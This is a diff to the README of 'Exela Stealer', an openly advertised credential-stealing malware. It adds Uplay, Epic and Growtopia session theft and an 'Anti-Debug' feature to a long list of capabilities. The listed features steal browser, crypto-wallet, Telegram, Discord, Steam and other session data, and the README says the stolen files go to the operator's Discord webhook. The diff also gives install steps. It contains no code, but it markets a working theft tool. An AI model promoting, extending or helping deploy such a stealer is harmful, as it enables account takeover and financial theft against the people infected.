@@ -21,23 +21,26 @@ Exela Stealer, a powerful and feature-rich tool, offers the following functional
 9. :moneybag: **Crypto & Wallet Stealer** - Steals cryptocurrency and wallet information.
 10. :cookie: **AutoFill Stealer** - Steals  browser autofill data.
 11. :iphone: **Telegram Session Stealer** - Steals Telegram session files.
-12. :bookmark: **Bookmark Stealer** - Steals browser bookmarks.
-13. :hourglass_flowing_sand: **History Stealer** - Steals  browser history.
-14. :floppy_disk: **Downloads Stealer** - Steals downloaded files.
-15. :camera: **Instagram Session Stealer & Validator** - Steals and validate Instagram sessions.
-16. :bird: **Twitter Session Stealer & Validator** - Steals and validate Twitter sessions.
-17. :notes: **Tiktok Session Stealer & Validator** - Steals and validate Tiktok sessions.
-18. :tv: **Twitch Session Stealer & Validator** - Steals and validate Twitch sessions.
-19. :musical_note: **Spotify Session Stealer & Validator** - Steals and validate Spotify sessions.
-20. :video_game: **Riot Games Session Stealer & Validator** - Steals and validate Riot Games sessions (valorant and lol).
-21. :speech_balloon: **Reddit Session Stealer & Validator** - Steals and validate Reddit sessions.
-22. :video_game: **Roblox Session Stealer & Validator** - Steals and validate Roblox sessions.
-23. :video_game: **Steam Session Stealer & Validator** - Steals and validate Steam sessions.
-24. :video_game: **Growtopia save.dat Stealer** - Steals Growtopia save.dat.
-25. :telephone_receiver: **Discord Token Stealer** - Steals Discord tokens.
-26. :computer: **System Info Stealer** - Steals system information.
-27. :clipboard: **Last Clipboard Text** - Steals the last clipboard text.
-28. :computer: **Process Stealer** - Steals running processes.
+12. :video_game: **Uplay Session Stealer** - Steals Uplay session files.
+13. :video_game: **Epic Session Stealer** - Steals Epic session files.
+14. :video_game: **Growtopia Session Stealer** - Steals Growtopia `save.dat`.
+15. :bookmark: **Bookmark Stealer** - Steals browser bookmarks.
+16. :hourglass_flowing_sand: **History Stealer** - Steals  browser history.
+17. :floppy_disk: **Downloads Stealer** - Steals downloaded files.
+18. :camera: **Instagram Session Stealer & Validator** - Steals and validate Instagram sessions.
+19. :bird: **Twitter Session Stealer & Validator** - Steals and validate Twitter sessions.
+20. :notes: **Tiktok Session Stealer & Validator** - Steals and validate Tiktok sessions.
+21. :tv: **Twitch Session Stealer & Validator** - Steals and validate Twitch sessions.
+22. :musical_note: **Spotify Session Stealer & Validator** - Steals and validate Spotify sessions.
+23. :video_game: **Riot Games Session Stealer & Validator** - Steals and validate Riot Games sessions (valorant and lol).
+24. :speech_balloon: **Reddit Session Stealer & Validator** - Steals and validate Reddit sessions.
+25. :video_game: **Roblox Session Stealer & Validator** - Steals and validate Roblox sessions.
+26. :video_game: **Steam Session Stealer & Validator** - Steals and validate Steam sessions.
+27. :video_game: **Growtopia save.dat Stealer** - Steals Growtopia save.dat.
+28. :telephone_receiver: **Discord Token Stealer** - Steals Discord tokens.
+29. :computer: **System Info Stealer** - Steals system information.
+30. :clipboard: **Last Clipboard Text** - Steals the last clipboard text.
+31. :computer: **Process Stealer** - Steals running processes.
 
 ## Builder Settings 🔧
 
@@ -59,19 +62,6 @@ To set up Exela Stealer, follow these steps:
 4. :point_right: Navigate to the Exela Stealer folder and double click `install.bat`.
 5. :rocket: Follow the on-screen instructions to complete the setup.
 
-## Supported Browsers 🌐
-Exela Stealer supports the following web browsers:
-
-1. :globe_with_meridians: **Google Chrome**
-2. :fox_face: **Firefox**
-3. :o: **Opera**
-4. :atom_symbol: **Opera GX**
-5. :shield: **Brave**
-6. :european_castle: **Microsoft Edge**
-7. :musical_note: **Vivaldi** 
-8. :heavy_plus_sign: **And Much More** 
-9. :arrows_counterclockwise: **All Browsers Versions Supported** - Support for multiple versions of each browser.
-
 ## Todo 📝
 
 - Yandex Stealer
@@ -83,6 +73,7 @@ Exela Stealer supports the following web browsers:
 ## Additional ℹ️
 
 - Sends all files to your Discord webhook in beautiful embeds and a structured zip file
+- Anti-Debug
 
 ## Disclaimer ⚠️
 
